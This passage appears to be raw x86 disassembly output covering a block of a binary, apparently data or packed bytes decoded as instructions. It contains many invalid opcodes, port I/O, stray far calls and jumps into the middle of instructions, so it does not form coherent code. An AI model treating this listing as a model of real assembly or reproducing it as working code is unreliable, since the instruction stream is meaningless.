  4076db:	dec    esp
  4076dd:	mov    edx,0x6fd6d29b
  4076e2:	add    ah,BYTE PTR [ecx]
  4076e4:	out    0x97,eax
  4076e6:	pop    eax
  4076e7:	mov    ?,WORD PTR [esi+0x7a]
  4076ea:	mov    bl,0xaf
  4076ec:	js     0x4076e6
  4076ee:	mul    BYTE PTR [edx+ebx*8]
  4076f1:	ret    
  4076f2:	add    BYTE PTR [edx+eax*1-0x5d],cl
  4076f6:	(bad)  
  4076f7:	(bad)  
  4076f8:	jmp    DWORD PTR [ebx+0x28]
  4076fb:	pop    ebx
  4076fc:	test   eax,0x2dec5d99
  407701:	mov    al,ds:0xa7ae1b94
  407706:	jno    0x4076f5
  407708:	call   0xa95b:0xf2e9e630
  40770f:	adc    edx,DWORD PTR ds:0x250318bc
  407715:	in     al,dx
  407716:	loope  0x40770b
  407718:	adc    ebx,esp
  40771a:	stos   BYTE PTR es:[edi],al
  40771b:	sub    al,0xd5
  40771d:	outs   dx,BYTE PTR ds:[esi]
  40771e:	js     0x4076ab
  407720:	xor    dh,BYTE PTR [edx]
  407722:	outs   dx,DWORD PTR ds:[esi]
  407723:	dec    edi
  407724:	icebp  
  407725:	adc    BYTE PTR [esi+edi*1+0x70daca8c],bl
  40772c:	cmp    eax,0xe715ede6
  407731:	xchg   ecx,eax
  407732:	adc    al,0x8a
  407734:	mov    eax,ds:0x7be6e4fe
  407739:	jo     0x40776c
  40773b:	or     BYTE PTR [ebx-0x35098ddf],0xff
  407742:	sub    BYTE PTR [edi],0xda
  407745:	mov    ah,0x25
  407747:	sbb    al,0x9d
  407749:	cmp    edx,DWORD PTR [ecx+edi*4+0x4]
  40774d:	(bad)  
  407750:	int3   
  407751:	hlt    
  407752:	ret    0x951d
  407755:	fimul  WORD PTR [esi]
  407757:	xchg   ebp,eax
  407758:	or     eax,0x68217f7d
  40775d:	xor    dh,BYTE PTR [esi]
  40775f:	inc    ebx
  407760:	adc    DWORD PTR [edi+0x13e78926],edx
  407766:	aad    0xa
  407768:	adc    eax,0x8e99f550
  40776d:	stos   BYTE PTR es:[edi],al
  40776e:	retf   0xd69c
  407771:	ss inc eax
  407773:	cmp    al,0xa1
  407775:	fdiv   DWORD PTR [ecx+0x2caf9908]
  40777b:	mov    dh,0x79
  40777d:	retf   0xf49a
  407780:	imul   BYTE PTR [eax+edi*4]
  407783:	adc    eax,0x358d4186
  407788:	dec    esi
  407789:	sbb    ch,dh
  40778b:	pop    ebp
  40778c:	les    ecx,FWORD PTR [eax]
  40778e:	js     0x4077a4
  407790:	ror    dl,0x60
  407793:	inc    eax
  407794:	push   ebx
  407795:	add    esi,edi
  407797:	loopne 0x4077f9
  407799:	fist   DWORD PTR [ebx+0x6954244e]
  40779f:	mov    ah,0xc4
  4077a1:	and    dl,dh
  4077a3:	dec    eax
  4077a4:	add    BYTE PTR [edi],0xcd
  4077a7:	mov    esp,0xa5e37d2e
  4077ac:	hlt    
  4077ad:	add    BYTE PTR [ebp+ebp*4+0x3f],al
  4077b1:	xchg   BYTE PTR ds:0x5594574d,ch
  4077b7:	xchg   BYTE PTR [edx],bl
  4077b9:	mov    eax,ds:0xe1c0d743
  4077be:	call   0x8684ed75
  4077c3:	pop    ebx
  4077c4:	mov    dl,0x3d
  4077c6:	mov    ebp,0xf44e526f
  4077cb:	aam    0x83
  4077cd:	mov    ah,0xe9
  4077cf:	mov    dh,0x92
  4077d1:	jo     0x407774
  4077d3:	mov    ds:0x67e5e01b,eax
  4077d8:	mov    edi,0x66c1c7c0
  4077dd:	add    eax,DWORD PTR [eax-0x4f675860]
  4077e3:	lahf   
  4077e4:	pusha  
  4077e5:	adc    bl,BYTE PTR es:[esi+0x6369410e]
  4077ec:	adc    eax,0xf1eb953c
  4077f1:	add    bl,ah
  4077f3:	shl    BYTE PTR [eax*4+0x48fd0e5b],cl
  4077fa:	push   ss
  4077fb:	jae    0x407873
  4077fd:	jecxz  0x407787
  4077ff:	mov    bl,0xed
  407802:	inc    esi
  407803:	and    DWORD PTR [esi+0x146d88ab],0x30612812
  40780d:	adc    BYTE PTR [esi+0x6fb6539f],ah
  407813:	loop   0x4077cc
  407815:	xor    al,0x8
  407817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407818:	or     DWORD PTR [eax],esi
  40781a:	out    dx,eax
  40781b:	and    al,0x2b
  40781d:	add    al,0x50
  40781f:	ficomp DWORD PTR [edx+0x69b732d2]
  407825:	cmp    BYTE PTR [edi+0x10],bh
  407828:	pop    es
  407829:	xchg   ebp,eax
  40782a:	out    0xa2,eax
  40782c:	das    
  40782d:	out    dx,eax
  40782e:	mov    eax,0x385e105f
  407833:	add    al,0xa5
  407835:	in     al,0xfe
  407837:	pop    ss
  407838:	adc    bh,BYTE PTR [eax]
  40783a:	aas    
  40783b:	in     eax,dx
  40783c:	call   0xcb4f:0x2e5ad28a
  407843:	ds jg  0x407826
  407846:	cmp    BYTE PTR [esi+eax*2],dl
  407849:	add    DWORD PTR [ecx+0x47aabd6],edi
  40784f:	pusha  
  407850:	out    dx,eax
  407851:	sbb    DWORD PTR [edx-0x6],esp
  407854:	or     al,0xfe
  407856:	retf   
  407857:	fs je  0x4077dd
  40785a:	ja     0x407858
  40785c:	sar    BYTE PTR [edi+ecx*8],1
  40785f:	out    dx,eax
  407860:	mov    al,ds:0x419e6011
  407865:	loop   0x4078d8
  407867:	call   0x21e:0x6512d268
  40786e:	std    
  40786f:	(bad)  
  407870:	je     0x40789b
  407872:	cmp    BYTE PTR [edi],dh
  407874:	add    esi,DWORD PTR ds:0xbd199890
  40787a:	mov    dh,0x59
  40787c:	or     esi,DWORD PTR ds:0x9f34b2fd
  407882:	xor    al,0xf1
  407884:	popa   
  407885:	adc    eax,DWORD PTR [ebx]
  407887:	sbb    al,0xb8
  407889:	xchg   DWORD PTR [edi+0x69e44586],ecx
  40788f:	(bad)  
  407890:	dec    esp
  407891:	inc    DWORD PTR [ebx-0xf]
  407894:	fwait
  407895:	and    edx,DWORD PTR [eax-0xa26a0c]
  40789b:	enter  0x2a81,0xbb
  40789f:	push   esp
  4078a0:	pushf  
  4078a1:	js     0x40784e
  4078a3:	js     0x4078ea
  4078a5:	and    BYTE PTR [ecx+ebx*4-0x480b1674],dh
  4078ac:	fwait
  4078ad:	int    0xd1
  4078af:	sub    ecx,DWORD PTR [ebx-0x3]
  4078b2:	jne    0x4078ce
  4078b4:	mov    esp,0x23ea9c4
  4078b9:	cmp    ebx,DWORD PTR [ebp+esi*4-0x7f]
  4078bd:	mov    dh,0x3a
  4078bf:	inc    esi
  4078c0:	jae    0x4078ae
  4078c2:	repnz mov cs,WORD PTR ds:0xd034f369
  4078c9:	data16 add al,BYTE PTR [edi-0x5e]
  4078cd:	jl     0x407910
  4078cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078d0:	rcr    DWORD PTR [edi+0x5f057a69],0xa4
  4078d7:	inc    edi
  4078d8:	adc    esp,edi
  4078da:	aas    
  4078db:	js     0x40785d
  4078dd:	sahf   
  4078de:	pop    edx
  4078df:	gs scas eax,DWORD PTR es:[edi]
  4078e1:	xor    esi,DWORD PTR [edi+0x9031076]
  4078e7:	dec    esi
  4078e8:	mov    eax,ds:0x4f8d7bf7
  4078ed:	inc    ecx
  4078ee:	sub    eax,0x1f2e5cce
  4078f3:	test   DWORD PTR [edi-0x33cffa66],ebx
  4078f9:	test   eax,0x7b092046
  4078fe:	pushf  
  4078ff:	cmp    BYTE PTR [eax],0xf
  407902:	pushf  
  407903:	pop    edx
  407904:	daa    
  407905:	ja     0x40792c
  407907:	xor    al,0xba
  407909:	sbb    eax,0x39d0622d
  40790e:	in     eax,dx
  40790f:	jae    0x407906
  407911:	pcmpeqw mm4,QWORD PTR [edx-0x47]
  407915:	xor    ecx,DWORD PTR [ebx]
  407917:	pop    ebp
  407918:	out    0xff,al
  40791a:	cli    
  40791b:	lahf   
  40791c:	sub    al,0x68
  40791e:	imul   esp,DWORD PTR [ecx+0x699a9d64],0x3f5693da
  407928:	rcl    BYTE PTR [ebx+0x21a624df],0x11
  40792f:	jp     0x40791d
  407931:	jmp    0x2b8d:0x6cbcaa7d
  407938:	or     ebp,DWORD PTR [eax-0x15328c74]
  40793e:	icebp  
  40793f:	mov    ?,WORD PTR [edi-0x33]
  407942:	lock and al,0xb9
  407945:	imul   eax,esi,0x6eee7378
  40794b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40794c:	je     0x4079ca
  40794e:	sub    eax,0x9179da9
  407953:	xchg   ecx,eax
  407954:	imul   BYTE PTR [edx-0x27]
  407957:	mov    edi,0xe62ae692
  40795c:	test   eax,0x4a68101
  407961:	jge    0x407934
  407963:	popf   
  407964:	add    al,0xaa
  407966:	push   eax
  407967:	or     esi,DWORD PTR [edx]
  407969:	inc    ecx
  40796a:	gs jmp 0xa164:0xd142ad0
  407972:	xchg   esp,eax
  407973:	xchg   esp,eax
  407974:	in     al,0x48
  407976:	stc    
  407977:	ds push eax
  407979:	ins    DWORD PTR es:[edi],dx
  40797a:	jnp    0x4079a7
  40797c:	ds scas eax,DWORD PTR es:[edi]
  40797e:	add    bl,BYTE PTR [edi+0x67]
  407981:	test   DWORD PTR [ebp+0x2d],esi
  407984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407985:	dec    esi
  407986:	adc    bl,BYTE PTR [ebp+eax*4+0x1c]
  40798a:	leave  
  40798b:	rol    BYTE PTR [ebp+0x68],0x9f
  40798f:	addr16 in eax,0x8c
  407992:	and    DWORD PTR [ecx*8-0x6901b32d],0x60
  40799a:	mov    ds:0xfdc6626b,al
  40799f:	adc    esi,DWORD PTR [edx-0x79]
  4079a2:	and    eax,0x3f57e9c9
  4079a7:	sbb    eax,DWORD PTR [ebx+edi*4-0x3343d73f]
  4079ae:	fwait
  4079af:	mov    esi,0x30fa9d10
  4079b4:	cmp    eax,0x40932f5a
  4079b9:	stos   BYTE PTR es:[edi],al
  4079ba:	cmp    DWORD PTR [edi+0x63],esi
  4079bd:	repz cwde 
  4079bf:	es pop edx
  4079c1:	cmp    dl,BYTE PTR [ecx]
  4079c3:	mov    esi,esi
  4079c5:	aam    0xfb
  4079c7:	hlt    
  4079c8:	(bad)  
  4079c9:	adc    DWORD PTR [ebp+0x2b83e67e],edi
  4079cf:	fimul  WORD PTR [edi-0x4a]
  4079d2:	inc    ecx
  4079d3:	pop    ds
  4079d4:	or     al,0x61
  4079d6:	xor    DWORD PTR [esi+edx*4],0xbc2762a4
  4079dd:	cmp    DWORD PTR [ecx+ecx*8-0x31],eax
  4079e1:	call   FWORD PTR [ecx+0x41a3b362]
  4079e7:	(bad)  
  4079e8:	call   0xcf45:0xe0135615
  4079ef:	loop   0x407a39
  4079f1:	and    edi,0x26ab9f0d
  4079f7:	adc    BYTE PTR [edx+0xbb3dd14],al
  4079fd:	inc    eax
  4079fe:	mov    al,ds:0x2b3ba112
  407a03:	ss out 0x93,al
  407a06:	push   ebp
  407a07:	mov    gs,WORD PTR [ebp-0x14]
  407a0a:	xchg   edi,eax
  407a0b:	out    0x72,eax
  407a0d:	shl    BYTE PTR [eax-0x44],1
  407a10:	fucomip st,st(3)
  407a12:	in     al,dx
  407a13:	pop    esi
  407a14:	pop    ebx
  407a15:	inc    edx
  407a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a17:	lea    ebx,[edx+0x6d]
  407a1a:	inc    ebp
  407a1b:	fisub  DWORD PTR [ebx-0x91c9c78]
  407a21:	sub    DWORD PTR [ebp+eax*1+0x4f],ebp
  407a25:	pop    ecx
  407a26:	cli    
  407a27:	sbb    ah,dh
  407a29:	sub    DWORD PTR [esi+0x52db01aa],0xffffff84
  407a30:	sbb    al,0x87
  407a32:	and    DWORD PTR [ebx-0x4ec137ce],0x47
  407a39:	inc    ecx
  407a3a:	clc    
  407a3b:	jne    0x407a8f
  407a3d:	mov    al,ds:0xdfdbd21b
  407a42:	adc    cl,BYTE PTR [ebp+edx*2+0x42]
  407a46:	add    DWORD PTR [ecx+esi*8],edx
  407a49:	pushf  
  407a4a:	outs   dx,DWORD PTR ds:[esi]
  407a4b:	out    0x61,eax
  407a4d:	mov    ebp,0x4f242d7b
  407a52:	shl    ebx,0x40
  407a55:	fmul   st(5),st
  407a57:	sub    bl,BYTE PTR [ebx]
  407a59:	in     al,dx
  407a5a:	adc    esp,DWORD PTR [ebp-0x2c00b1c7]
  407a60:	pop    edx
  407a61:	in     eax,0x6c
  407a63:	jne    0x407adb
  407a65:	xlat   BYTE PTR ds:[ebx]
  407a66:	into   
  407a67:	jecxz  0x407a1b
  407a69:	sub    al,0xf0
  407a6b:	addr16 mov edi,0xe6090bd7
  407a71:	imul   ebp,ecx,0x8dde1bb5
  407a77:	lds    eax,FWORD PTR [esp+ebx*4]
  407a7a:	imul   esi,DWORD PTR [ebp+edi*1+0x4502c007],0x3a
  407a82:	xor    DWORD PTR [esi-0x78],ebx
  407a85:	fsubp  st(1),st
  407a87:	pop    esp
  407a88:	pop    edx
  407a89:	mov    ebp,DWORD PTR [ecx-0x47]
  407a8c:	sub    al,0x48
  407a8e:	sahf   
  407a8f:	lods   al,BYTE PTR ds:[esi]
  407a90:	mov    edx,0xe7ea46b4
  407a95:	mov    ecx,0xa4c1cef0
  407a9a:	popa   
  407a9b:	lods   al,BYTE PTR ds:[esi]
  407a9c:	cmp    eax,0x621a1dda
  407aa1:	jecxz  0x407a36
  407aa3:	inc    ebx
  407aa4:	xor    DWORD PTR [edi+edx*2-0x11],ebx
  407aa8:	cmp    BYTE PTR [eax+0x691d9613],dh
  407aae:	out    0x1f,al
  407ab0:	pusha  
  407ab1:	call   0x5a7a519
  407ab6:	mov    gs,edi
  407ab8:	rcl    cx,1
  407abb:	hlt    
  407abc:	inc    ebx
  407abd:	ja     0x407a98
  407abf:	loopne 0x407b19
  407ac1:	or     al,0x77
  407ac3:	cdq    
  407ac4:	pop    edi
  407ac5:	xchg   edx,eax
  407ac6:	sbb    al,0xd7
  407ac8:	inc    ebx
  407ac9:	sbb    al,0x5a
  407acb:	stc    
  407acc:	mov    ebp,0x8d05dac0
  407ad1:	and    DWORD PTR [ebx],esi
  407ad3:	sahf   
  407ad4:	test   al,0xa2
  407ad6:	push   es
  407ad7:	jg     0x407b43
  407ad9:	in     eax,0x2f
  407adb:	jle    0x407a5f
  407add:	retf   
  407ade:	fwait
  407adf:	mov    ecx,0x277e7d0
  407ae4:	retf   0x3a4e
  407ae7:	jecxz  0x407a6e
  407ae9:	pop    esp
  407aea:	ds inc ebp
  407aec:	jns    0x407ae1
  407aee:	outs   dx,BYTE PTR ds:[esi]
  407aef:	rcr    ch,0x6f
  407af2:	jae    0x407ad2
  407af4:	sub    al,bh
  407af6:	sbb    BYTE PTR [edi+0x79ecf500],bl
  407afc:	shl    BYTE PTR [ebx],0x37
  407aff:	jns    0x407b6f
  407b01:	cmp    BYTE PTR [edi+eax*8],dh
  407b04:	adc    ecx,DWORD PTR [edi+0x60b3d793]
  407b0a:	sub    al,0x39
  407b0c:	mov    bl,0x6e
  407b0e:	daa    
  407b0f:	cmc    
  407b10:	clc    
  407b11:	inc    eax
  407b12:	mov    esp,0xe27051ee
  407b17:	lock cmp al,0x8a
  407b1a:	mov    ebx,0x3d64fca6
  407b1f:	add    DWORD PTR [ebp+0xf7629d6],0xdcc6e57
  407b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2a:	pop    edi
  407b2b:	retf   0x14
  407b2e:	mov    ecx,0xaf17e65e
  407b33:	inc    ebp
  407b34:	popf   
  407b35:	ret    0x2e2
  407b38:	pop    esi
  407b39:	fs arpl bx,di
  407b3c:	or     eax,DWORD PTR [edi+0x72]
  407b3f:	cmp    DWORD PTR [edx+0x7a],edx
  407b42:	in     eax,0xe4
  407b44:	sbb    bl,cl
  407b46:	lods   eax,DWORD PTR ds:[esi]
  407b47:	add    al,0xde
  407b49:	out    0xdd,eax
  407b4b:	mov    ds:0xa46c85d4,eax
  407b50:	push   edi
  407b51:	cmp    BYTE PTR [esi+0x3b],cl
  407b54:	sbb    al,0x97
  407b56:	xor    esi,0xf73a20f1
  407b5c:	xchg   ebp,eax
  407b5d:	fnstenv ds:0x43c1afe5
  407b63:	je     0x407b53
  407b65:	adc    al,0x67
  407b67:	adc    esp,edx
  407b69:	aaa    
  407b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b6c:	test   bh,al
  407b6e:	ss and al,0x37
  407b71:	mov    al,ds:0x50ac78dc
  407b76:	push   esp
  407b77:	dec    esp
  407b78:	xor    BYTE PTR [eax-0x5eeccaba],dl
  407b7e:	xchg   ebp,eax
  407b7f:	rcl    BYTE PTR [eax-0x5e9e2400],0xb
  407b86:	ds aam 0x94
  407b89:	stos   DWORD PTR es:[edi],eax
  407b8a:	and    al,0x5f
  407b8c:	inc    ecx
  407b8d:	sbb    bl,al
  407b8f:	sub    eax,0x41255170
  407b94:	mov    gs,WORD PTR [ecx+0x62]
  407b97:	add    dl,BYTE PTR [edi-0xf670e9c]
  407b9d:	and    eax,0x5d4fa56a
  407ba2:	scas   eax,DWORD PTR es:[edi]
  407ba3:	ficomp WORD PTR [esi+0x3399ab80]
  407ba9:	std    
  407baa:	push   edi
  407bab:	lods   eax,DWORD PTR ds:[esi]
  407bac:	xchg   ebx,eax
  407bad:	imul   esi,DWORD PTR [ebx+0x1],0xffffffaa
  407bb1:	fld    QWORD PTR [ebx+edi*8-0x17c0148e]
  407bb8:	lea    ecx,[edx+0x29]
  407bbb:	scas   al,BYTE PTR es:[edi]
  407bbc:	(bad)  
  407bbd:	iret   
  407bbe:	(bad)  
  407bbf:	div    DWORD PTR [edi]
  407bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bc2:	or     cl,al
  407bc4:	repz pop edx
  407bc6:	in     eax,dx
  407bc7:	pop    ebp
  407bc8:	(bad)  
  407bc9:	jb     0x407c29
  407bcb:	xchg   edi,eax
  407bcc:	es push edx
  407bce:	pusha  
  407bcf:	mov    esp,DWORD PTR [eax+0x2d]
  407bd2:	pop    ecx
  407bd3:	jmp    0x407b83
  407bd5:	adc    al,0x67
  407bd7:	dec    edi
  407bd8:	daa    
  407bd9:	sub    eax,0x287aec94
  407bde:	mov    al,ds:0x7301f938
  407be3:	add    ah,BYTE PTR [edi]
  407be5:	imul   eax,eax,0xffffff8d
  407be8:	mov    es:0x4a6d0409,al
  407bee:	inc    esp
  407bef:	pop    ebp
  407bf0:	mov    ds:0x4fa7db10,al
  407bf5:	jbe    0x407c41
  407bf7:	sbb    DWORD PTR [edi-0x68],ecx
  407bfa:	pop    edx
  407bfb:	aad    0xec
  407bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bfe:	inc    esp
  407bff:	push   edi
  407c00:	inc    ebp
  407c01:	repz aad 0x8c
  407c04:	fidivr DWORD PTR ds:[edi-0x2ad5bc70]
  407c0b:	push   eax
  407c0c:	aas    
  407c0d:	not    DWORD PTR [ebx-0xdf0a737]
  407c13:	mov    esp,0x4d2572ab
  407c18:	scas   eax,DWORD PTR es:[edi]
  407c19:	stos   DWORD PTR es:[edi],eax
  407c1a:	out    0x4d,al
  407c1c:	retf   
  407c1d:	pop    ebp
  407c1e:	push   es
  407c1f:	pop    esp
  407c20:	fcom   DWORD PTR [ecx]
  407c22:	adc    eax,0x73ef9e9c
  407c27:	jno    0x407bff
  407c29:	cmp    ah,BYTE PTR [esp+esi*8]
  407c2c:	in     eax,0xa3
  407c2e:	icebp  
  407c2f:	add    ecx,ecx
  407c31:	sub    edi,edx
  407c33:	enter  0x818a,0x41
  407c37:	mov    ah,0x53
  407c39:	inc    esp
  407c3a:	nop
  407c3b:	xor    BYTE PTR [ebx-0x4d54388f],dl
  407c41:	loopne 0x407cbb
  407c43:	ror    DWORD PTR [edx],0x3a
  407c46:	push   ebp
  407c47:	cdq    
  407c48:	adc    al,0x6a
  407c4a:	push   0x9ede2699
  407c4f:	dec    edi
  407c50:	adc    edx,DWORD PTR [ecx-0x6264f2e]
  407c56:	not    DWORD PTR [edx+0x63d06a19]
  407c5c:	into   
  407c5d:	mov    bh,0xf2
  407c5f:	sub    BYTE PTR [edi+edi*2],0x91
  407c63:	pop    esi
  407c64:	dec    ecx
  407c65:	dec    edi
  407c66:	adc    al,0xa
  407c68:	retf   
  407c69:	fidivr WORD PTR [ecx-0x7]
  407c6c:	adc    al,BYTE PTR [ebx]
  407c6e:	xor    al,0x48
  407c70:	add    ebx,DWORD PTR [ebp+ebx*2-0x6e379804]
  407c77:	xor    eax,0x5f01fd4c
  407c7c:	dec    ebx
  407c7d:	adc    BYTE PTR [eax],ah
  407c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c80:	shr    bl,0xc4
  407c83:	sbb    BYTE PTR [ecx+0x403517d0],al
  407c89:	or     DWORD PTR ds:0x601aae84,esi
  407c8f:	push   ebx
  407c90:	adc    eax,0x4a5a3f92
  407c95:	leave  
  407c96:	imul   esp,DWORD PTR [eax],0xe953da71
  407c9c:	ror    DWORD PTR [esi],cl
  407c9e:	ins    DWORD PTR es:[edi],dx
  407c9f:	stc    
  407ca0:	lds    esp,FWORD PTR [eax]
  407ca2:	mov    esp,0x92838ce4
  407ca7:	jbe    0x407c77
  407ca9:	cmp    eax,0xc4dc6e8b
  407cae:	cmp    al,0xdd
  407cb0:	scas   eax,DWORD PTR es:[edi]
  407cb1:	add    DWORD PTR [edi-0x5],0x79503b85
  407cb8:	(bad)  
  407cb9:	jo     0x407c9b
  407cbb:	push   ecx
  407cbc:	fs xchg esi,eax
  407cbe:	sub    cl,0xd
  407cc1:	mov    dh,0x6f
  407cc3:	lock sbb ch,bh
  407cc6:	and    DWORD PTR [eax-0x1a],edx
  407cc9:	mov    DWORD PTR [edi],ebp
  407ccb:	cdq    
  407ccc:	sub    bh,BYTE PTR [ebx-0x5d]
  407ccf:	dec    edi
  407cd0:	lods   al,BYTE PTR ds:[esi]
  407cd1:	jb     0x407c58
  407cd3:	mov    cl,0xff
  407cd5:	mov    ds:0x3d9e7ec9,al
  407cda:	xor    ah,BYTE PTR [esi-0x6b]
  407cdd:	mov    esi,0x15d17033
  407ce2:	dec    edi
  407ce3:	cmp    al,0xab
  407ce5:	push   esp
  407ce6:	or     eax,0x6c48d460
  407ceb:	push   ss
  407cec:	mov    ds:0xa101d783,al
  407cf1:	imul   ebp,DWORD PTR [eax+0x40f2306],0x52
  407cf8:	jl     0x407cf8
  407cfa:	in     eax,0xe3
  407cfc:	loope  0x407ce6
  407cfe:	outs   dx,DWORD PTR ds:[esi]
  407cff:	sub    BYTE PTR [edx],cl
  407d01:	push   cs
  407d02:	push   esp
  407d03:	jmp    0xfc2b87a9
  407d08:	mov    ah,0xc0
  407d0a:	mov    edx,0xb6f3deaa
  407d0f:	xor    cl,BYTE PTR ds:0x1cc40d4a
  407d15:	mul    DWORD PTR [ecx+0x40]
  407d18:	xlat   BYTE PTR ds:[ebx]
  407d19:	popa   
  407d1a:	and    al,0x1b
  407d1c:	loopne 0x407d46
  407d1e:	sub    DWORD PTR [ebp-0x1b1a03aa],0xe30ce082
  407d28:	fsubrp st(5),st
  407d2a:	js     0x407da4
  407d2c:	and    al,0xf8
  407d2e:	push   esp
  407d2f:	ins    BYTE PTR es:[edi],dx
  407d30:	push   ebx
  407d31:	mov    esp,0xae62932d
  407d36:	fwait
  407d37:	(bad)  
  407d38:	test   eax,0x6e96fb3
  407d3d:	fstp   TBYTE PTR [ebp-0x1b]
  407d40:	ss retf 0xb1ac
  407d44:	or     eax,0x608fa713
  407d49:	in     eax,0xe
  407d4b:	and    ch,BYTE PTR [ecx]
  407d4d:	popf   
  407d4e:	dec    edi
  407d4f:	pcmpgtw mm5,QWORD PTR [esi-0x3f4b47e2]
  407d56:	fwait
  407d57:	push   0xa98375fa
  407d5c:	mov    BYTE PTR [ebx-0x22],dh
  407d5f:	fnsave [edi]
  407d61:	or     BYTE PTR [ecx],0x7f
  407d64:	mov    es,WORD PTR [ebx-0x7ed34240]
  407d6a:	in     al,0x1
  407d6c:	or     esp,DWORD PTR [edi+0x4fc19d68]
  407d72:	adc    eax,0xf243feea
  407d77:	stc    
  407d78:	(bad)  
  407d7a:	sbb    DWORD PTR [edi-0x3a86c7f2],eax
  407d80:	push   esi
  407d81:	loop   0x407dca
  407d83:	sbb    DWORD PTR [ebp-0x628e8359],edi
  407d89:	jne    0x407da0
  407d8b:	push   esi
  407d8c:	addr16 out 0x9a,eax
  407d8f:	fadd   QWORD PTR [esp+ebx*2-0x30]
  407d93:	mov    edi,DWORD PTR [ecx-0x34e53ba2]
  407d99:	sub    cl,BYTE PTR [edi+0x88cc985]
  407d9f:	loopne 0x407d62
  407da1:	ret    
  407da2:	cmp    eax,0x1994e123
  407da7:	or     al,0x8b
  407da9:	call   0xdc82e1fc
  407dae:	jge    0x407def
  407db0:	test   al,0x2c
  407db2:	imul   edi,DWORD PTR [ecx+0x71325b83],0xd6b43988
  407dbc:	jmp    0xbd91:0xe3c3bef3
  407dc3:	inc    DWORD PTR [edi-0x6ea1e056]
  407dc9:	loop   0x407dd3
  407dcb:	rol    BYTE PTR [esi+0x4b],0x42
  407dcf:	cdq    
  407dd0:	call   0x99caa860
  407dd5:	bound  edi,QWORD PTR [ebx-0x4f]
  407dd8:	test   BYTE PTR [edi],0x92
  407ddb:	jp     0x407e4f
  407ddd:	push   edi
  407dde:	add    edx,esp
  407de0:	and    eax,0x55343be7
  407de5:	jl     0x407e62
  407de7:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407de9:	cmp    eax,0xefedfb6
  407dee:	xor    BYTE PTR [edi+edx*4+0x294b44],ah
  407df5:	mov    ds:0x656aa351,al
  407dfa:	dec    edi
  407dfb:	mov    WORD PTR [ebx-0xd],ds
  407dfe:	sbb    dh,al
  407e00:	(bad)  
  407e01:	jbe    0x407e39
  407e03:	call   0xb965:0x978b7b9c
  407e0a:	fld    TBYTE PTR [esi]
  407e0c:	test   cl,0xa4
  407e0f:	in     al,0xd9
  407e11:	jae    0x407e1f
  407e13:	cmc    
  407e14:	dec    ebx
  407e15:	jge    0x407dc3
  407e17:	push   ss
  407e18:	add    dl,BYTE PTR [ebx-0x45]
  407e1b:	call   0xc74:0x692ff803
  407e22:	inc    edi
  407e23:	inc    ebx
  407e24:	ss pop ds
  407e26:	mov    ebx,0x2573aad0
  407e2b:	jg     0x407e74
  407e2d:	jmp    0x584a133d
  407e32:	rol    DWORD PTR [eax],cl
  407e34:	fsubr  QWORD PTR [ebx]
  407e36:	and    edi,ebp
  407e38:	and    eax,0x4d02cb1d
  407e3d:	jle    0x407e5f
  407e3f:	retw   
  407e41:	ss in  eax,dx
  407e43:	cld    
  407e44:	(bad)  
  407e45:	out    dx,al
  407e46:	cmp    edx,DWORD PTR [esi+ecx*2]
  407e49:	push   esi
  407e4a:	sub    bh,BYTE PTR [ebx-0x42]
  407e4d:	rcl    DWORD PTR [edi],cl
  407e4f:	dec    ebx
  407e50:	scas   eax,DWORD PTR es:[edi]
  407e51:	xchg   DWORD PTR ds:0x55c40082,edi
  407e57:	in     al,0x84
  407e59:	shr    al,0x2b
  407e5c:	xchg   ebp,eax
  407e5d:	cld    
  407e5e:	dec    edx
  407e5f:	dec    ebx
  407e60:	jmp    0x2ffa:0x15eafd75
  407e67:	call   0x5915:0xadb99d0c
  407e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e6f:	in     eax,dx
  407e70:	cmp    al,0xd8
  407e72:	inc    ecx
  407e73:	or     eax,0x59735ca4
  407e78:	enter  0x4a95,0x5c
  407e7c:	jg     0x407e14
  407e7e:	pop    ecx
  407e7f:	idiv   BYTE PTR [edi]
  407e81:	ins    BYTE PTR es:[edi],dx
  407e82:	addr16 ja 0x407eda
  407e85:	adc    DWORD PTR [ecx+eax*4],eax
  407e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e89:	dec    ebx
  407e8a:	sbb    DWORD PTR [ecx-0x55],edx
  407e8d:	dec    edi
  407e8e:	fsub   QWORD PTR [eax+ebp*1+0x4dab0d6a]
  407e95:	mov    edi,0x31d44d99
  407e9a:	pop    eax
  407e9b:	dec    eax
  407e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e9d:	dec    ebp
  407e9e:	or     al,0x7d
  407ea0:	scas   al,BYTE PTR es:[edi]
  407ea1:	je     0x407f0f
  407ea3:	sub    edi,eax
  407ea5:	or     cl,BYTE PTR [ebx-0x50]
  407ea8:	aaa    
  407ea9:	cmp    eax,0x7fced63f
  407eae:	pusha  
  407eaf:	jl     0x407eaf
  407eb1:	sbb    DWORD PTR [ecx-0x4e],0x3b
  407eb5:	sub    DWORD PTR [esi+0x70585f3e],ecx
  407ebb:	sbb    al,0xda
  407ebd:	xor    eax,0x91536d41
  407ec2:	and    BYTE PTR [ecx+0x5b],ah
  407ec5:	xor    eax,0xfd5fa15d
  407eca:	iret   
  407ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ecc:	inc    edx
  407ecd:	call   0x56e56b10
  407ed2:	mov    ah,0xe
  407ed4:	shl    ecx,1
  407ed6:	nop
  407ed7:	or     ebp,esp
  407ed9:	adc    BYTE PTR [edx+edx*4],bh
  407edc:	bound  ebx,QWORD PTR [ecx]
  407ede:	and    BYTE PTR [esi+0x7c],0x14
  407ee2:	push   0xffffff9c
  407ee4:	ret    
  407ee5:	shr    ch,cl
  407ee7:	sbb    eax,0x74760a7f
  407eec:	sbb    dh,dl
